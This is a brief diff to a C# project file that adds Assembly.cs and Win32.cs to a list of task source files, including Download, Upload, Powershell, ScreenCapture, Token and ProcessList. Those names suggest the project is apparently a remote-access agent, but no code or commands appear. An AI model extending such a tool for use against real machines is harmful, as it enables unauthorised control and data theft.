@@ -81,12 +81,14 @@
     <Compile Include="Tasks\ChangeDir.cs" />
     <Compile Include="Tasks\DirectoryList.cs" />
     <Compile Include="Tasks\Download.cs" />
+    <Compile Include="Tasks\Assembly.cs" />
     <Compile Include="Tasks\Exit.cs" />
     <Compile Include="Tasks\Powershell.cs" />
     <Compile Include="Tasks\ProcessList.cs" />
     <Compile Include="Tasks\ScreenCapture.cs" />
     <Compile Include="Tasks\Token.cs" />
     <Compile Include="Tasks\Upload.cs" />
+    <Compile Include="Win32.cs" />
   </ItemGroup>
   <ItemGroup>
     <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
